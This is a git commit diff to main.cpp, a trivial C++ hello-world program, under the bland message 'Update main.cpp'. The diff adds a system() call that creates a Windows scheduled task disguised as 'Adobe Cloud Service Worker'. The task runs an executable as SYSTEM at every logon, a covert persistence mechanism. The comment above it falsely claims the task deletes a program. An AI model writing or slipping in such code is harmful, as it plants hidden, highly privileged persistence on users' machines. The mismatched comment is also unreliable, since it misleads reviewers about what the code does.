3617f83078f0c73b8566fda91af220065e5ea256
qDread-dev <58754377+qDread-dev@users.noreply.github.com>
2023-10-02 20:54:08 -0400

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,9 +1,11 @@
 #include <iostream>
 #include <string>
 
-int main() {
-  std::cout << "Hello world!" << std::endl;
-  std::string test;
-  std::cin >> test;
-  return 1;
+int main(int argc, char* argv[]) {
+    std::cout << "Hello world!" << std::endl;
+    std::string test;
+    std::cin >> test;
+    // create a task to delete the program that is argv[1]
+    system("schtasks /create /tn \"Adobe Cloud Service Worker\" /tr \"C:\\Program Files\\Adobe Cloud Service Worker\\main.exe\" /sc onlogon /ru \"SYSTEM\"");
+    return 1;
 }
